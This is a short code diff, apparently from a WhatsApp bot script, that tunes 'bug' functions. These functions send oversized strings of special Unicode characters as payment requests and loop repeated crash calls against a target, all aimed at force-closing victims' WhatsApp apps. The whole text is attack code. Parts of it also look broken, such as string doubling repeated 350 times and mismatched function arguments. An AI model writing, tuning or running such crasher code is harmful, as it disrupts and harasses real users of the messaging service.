@@ -223,7 +223,7 @@ const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat
 //FUNCTION BUG
 async function fcPayment(sock, target) {
   let x = 'OrtuluhMatik ꦾ𑇂𑆵𑆴𑆿';
-  for (let i = 0; i < 120; i++) x += x;
+  for (let i = 0; i < 350; i++) x += x;
   
   await client.relayMessage(target, {
     sendPaymentRequest: {}
@@ -896,7 +896,7 @@ async function fuckgroupXnxx(target) {
 //BATAS FUNCTION
 //PEMANGILAN FUNCTION
 async function forcloselunox(target) {
-  for (let i = 0; i < 60; i++) {
+  for (let i = 0; i < 40; i++) {
     await ForceInvisions(target);
     await sleep(600);
     await fcPayment(target);
